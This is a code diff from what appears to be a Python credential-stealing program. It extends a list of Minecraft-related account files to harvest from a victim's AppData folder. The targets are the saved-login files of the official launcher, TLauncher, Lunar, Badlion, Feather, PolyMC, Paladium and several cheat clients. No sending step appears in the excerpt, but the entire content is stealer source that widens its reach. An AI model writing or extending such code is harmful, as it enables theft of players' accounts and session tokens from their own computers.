@@ -2144,7 +2144,19 @@ asyncio.run(main())
         try:
             minecraft_paths = [
                 {"name": "NationsGlory", "path": os.path.join(self.appdata, "NationsGlory", "Local Storage", "leveldb")},
-                {"name": "Minecraft", "path": os.path.join(self.appdata, ".minecraft", "launcher_accounts.json")},
+                {"name": "Minecraft", "path": os.path.join(self.appdata, ".minecraft", "launcher_accounts_microsoft_store.json")},
+                {"name": "Microsoft Store", "path": os.path.join(self.appdata, ".minecraft", "launcher_accounts.json")},
+                {"name": "CheatBreakers", "path": os.path.join(self.appdata, ".minecraft", "cheatbreaker_accounts.json")},
+                {"name": "TLauncher", "path": os.path.join(self.appdata, ".minecraft", "TlauncherProfiles.json")},
+                {"name": "Paladium", "path": os.path.join(self.appdata, "paladium-group", "accounts.json")},
+                {"name": "Novoline", "path": os.path.join(self.appdata, ".minecraft", "Novoline", "alts.novo")},
+                {"name": "Badlion", "path": os.path.join(self.appdata, "Badlion Client", "accounts.json")},
+                {"name": "Feather", "path": os.path.join(self.appdata, ".feather", "accounts.json")},
+                {"name": "Impact", "path": os.path.join(self.appdata, ".minecraft", "Impact", "alts.json")},
+                {"name": "Meteor", "path": os.path.join(self.appdata, ".minecraft", "meteor-client", "accounts.nbt")},
+                {"name": "PolyMC", "path": os.path.join(self.appdata, "PolyMC", "accounts.json")},
+                {"name": "Rise", "path": os.path.join(self.appdata, ".minecraft", "Rise", "alts.txt")},
+                {"name": "Lunar", "path": os.path.join(self.appdata, ".lunarclient", "settings", "game", "accounts.json")},
             ]
 
             for mc_path in minecraft_paths:
